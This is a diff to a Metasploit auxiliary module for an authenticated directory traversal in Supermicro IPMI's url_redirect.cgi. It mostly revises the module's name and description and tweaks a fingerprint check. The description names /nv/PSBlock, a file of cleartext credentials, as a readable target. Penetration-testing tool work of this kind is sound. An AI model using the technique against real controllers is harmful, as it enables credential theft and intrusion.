@@ -15,14 +15,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Supermicro Onboard IPMI Directory Taversal',
+      'Name'        => 'Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal',
       'Description' => %q{
-        This module abuses a directory traversal on the web interface for Supermicro Onboard IPMI. The
-        vulnerability exists in the url_redirect.cgi CGI application, due to a lack of sanitization
-        of the url_name parameter. This may allow an attacker with a valid, but not necessarily
-        administrator-level account, to access the contents of any file on the system. This includes
-        the /nv/PSBlock file, which contains the cleartext credentials for all configured accounts.
-        This module has been tested on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214.
+        This module abuses a directory traversal vulnerability in the url_redirect.cgi application 
+        accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability
+        is present due to a lack of sanitization of the url_name parameter. This allows an attacker with
+        a valid, but not necessarily administrator-level account, to access the contents of any file
+        on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
+        all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM) 
+        with firmware version SMT_X9_214.
       },
       'Author'       =>
         [
@@ -57,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
         "method"    => "GET"
       })
 
-    if res and res.code == 200 and res.body =~ /ATEN International Co Ltd\./
+    if res and res.code == 200 and res.body.to_s =~ /ATEN International Co Ltd\./
       return true
     else
       return false
